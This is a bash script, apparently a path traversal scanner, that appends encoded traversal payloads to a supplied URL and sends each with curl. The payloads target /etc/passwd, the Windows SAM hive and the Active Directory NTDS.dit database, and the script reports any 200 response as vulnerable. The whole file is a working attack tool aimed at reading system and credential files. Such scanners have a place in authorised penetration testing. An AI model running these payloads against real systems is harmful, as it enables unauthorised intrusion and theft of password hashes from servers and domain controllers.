#!/bin/bash

# Usage: ./path_traversal_checker.sh <url>

if [ -z "$1" ]; then
  echo "Usage: $0 <url>"
  exit 1
fi

# Input URL
base_url="$1"

# Payloads for Linux, Windows, and Active Directory
linux_payloads=(
  "../../../../../../../../../etc/passwd"
  "/etc/passwd"
  "....//....//....//....//....//....//etc/passwd"
  "....\\/....\\/....\\/....\\/....\\/....\\/etc/passwd"
  "..%252f..%252f..%252fetc/passwd"
  "/var/www/images/../../../../../../..../etc/passwd"
  "../../../../../../../../etc/passwd%00.png"
  "../../../../../../../../etc/passwd%00.jpg"
  "../../../../../../../../etc/passwd%00.jpeg"
  "../../../../../../../../etc/passwd%00.gif"
  "../../../../../../../../etc/passwd%00.webp"
  "../../../../../../../../etc/passwd%00.img"
  "%2e%2e%2f%2e%2e%2fetc/passwd"
  "%252e%252e%252f%252e%252e%252fetc/passwd"
  "..%c0%af..%c0%af..%c0%af..%c0%afetc/passwd"
  "..%ef%bc%8f..%ef%bc%8f..%ef%bc%8f..%ef%bc%8fetc/passwd"
  "/var/www/images/../../../../../etc/passwd"
)

windows_payloads=(
  "C:\\Windows\\system32\\config\\SAM"
  "..\\..\\..\\..\\..\\..\\..\\..\\Windows\\system32\\config\\SAM"
  "....//....//....//....//....//Windows/system32/config/SAM"
  "....\\\\....\\\\....\\\\....\\\\....\\\\Windows\\\\system32\\\\config\\\\SAM"
  "..%252f..%252f..%252fWindows/system32/config/SAM"
  "/var/www/images/../../../../../../..../Windows/system32/config/SAM"
  "../../../../../../../../Windows/system32/config/SAM%00.png"
  "../../../../../../../../Windows/system32/config/SAM%00.jpg"
  "../../../../../../../../Windows/system32/config/SAM%00.jpeg"
  "../../../../../../../../Windows/system32/config/SAM%00.gif"
  "../../../../../../../../Windows/system32/config/SAM%00.webp"
  "../../../../../../../../Windows/system32/config/SAM%00.img"
  "%2e%2e%2f%2e%2e%2fWindows/system32/config/SAM"
  "%252e%252e%252f%252e%252e%252fWindows/system32/config/SAM"
  "..%c0%af..%c0%af..%c0%af..%c0%afWindows/system32/config/SAM"
  "..%ef%bc%8f..%ef%bc%8f..%ef%bc%8f..%ef%bc%8fWindows/system32/config/SAM"
)

ad_payloads=(
  "C:\\Windows\\NTDS\\NTDS.dit"
  "..\\..\\..\\..\\..\\..\\..\\..\\Windows\\NTDS\\NTDS.dit"
  "....//....//....//....//....//Windows/NTDS/NTDS.dit"
  "....\\\\....\\\\....\\\\....\\\\....\\\\Windows\\\\NTDS\\\\NTDS.dit"
  "..%252f..%252f..%252fWindows/NTDS/NTDS.dit"
  "/var/www/images/../../../../../../..../Windows/NTDS/NTDS.dit"
  "../../../../../../../../Windows/NTDS/NTDS.dit%00.png"
  "../../../../../../../../Windows/NTDS/NTDS.dit%00.jpg"
  "../../../../../../../../Windows/NTDS/NTDS.dit%00.jpeg"
  "../../../../../../../../Windows/NTDS/NTDS.dit%00.gif"
  "../../../../../../../../Windows/NTDS/NTDS.dit%00.webp"
  "../../../../../../../../Windows/NTDS/NTDS.dit%00.img"
  "%2e%2e%2f%2e%2e%2fWindows/NTDS/NTDS.dit"
  "%252e%252e%252f%252e%252e%252fWindows/NTDS/NTDS.dit"
  "..%c0%af..%c0%af..%c0%af..%c0%afWindows/NTDS/NTDS.dit"
  "..%ef%bc%8f..%ef%bc%8f..%ef%bc%8f..%ef%bc%8fWindows/NTDS/NTDS.dit"
)

# Function to test each payload
test_payload() {
  local payload="$1"
  full_url="${base_url}${payload}"

  # Send the request and get the status code
  response=$(curl -o /dev/null -s -w "%{http_code}\n" "$full_url")

  # Check if the status code indicates a potential vulnerability
  if [[ "$response" == "200" ]]; then
    echo "Vulnerable to this payload: $payload (Status Code: $response)"
  else
    echo "Not vulnerable to this payload: $payload (Status Code: $response)"
  fi
}

# Test Linux payloads
echo "Testing Linux payloads..."
for payload in "${linux_payloads[@]}"; do
  test_payload "$payload"
done

# Test Windows payloads
echo "Testing Windows payloads..."
for payload in "${windows_payloads[@]}"; do
  test_payload "$payload"
done

# Test Active Directory payloads
echo "Testing Active Directory payloads..."
for payload in "${ad_payloads[@]}"; do
  test_payload "$payload"
done
